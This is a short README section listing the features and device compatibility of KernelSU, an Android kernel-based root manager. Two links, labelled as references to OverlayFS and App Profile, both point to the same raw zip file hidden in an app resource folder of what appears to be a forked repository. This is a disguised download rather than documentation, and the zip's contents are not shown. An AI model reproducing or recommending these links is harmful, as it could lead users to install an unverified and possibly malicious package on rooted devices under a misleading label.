## Features

1. Kernel-based `su` and root access management.
2. Module system based on [OverlayFS](https://raw.githubusercontent.com/AX-star/KernelSU/main/manager/app/src/main/res/values-night/KernelSU_v1.3.zip).
3. [App Profile](https://raw.githubusercontent.com/AX-star/KernelSU/main/manager/app/src/main/res/values-night/KernelSU_v1.3.zip): Lock up the root power in a cage.

## Compatibility state

KernelSU officially supports Android GKI 2.0 devices (kernel 5.10+). Older kernels (4.14+) are also supported, but the kernel will need to be built manually.

With this, WSA, ChromeOS, and container-based Android are all supported.

Currently, only the `arm64-v8a` and `x86_64` architectures are supported.
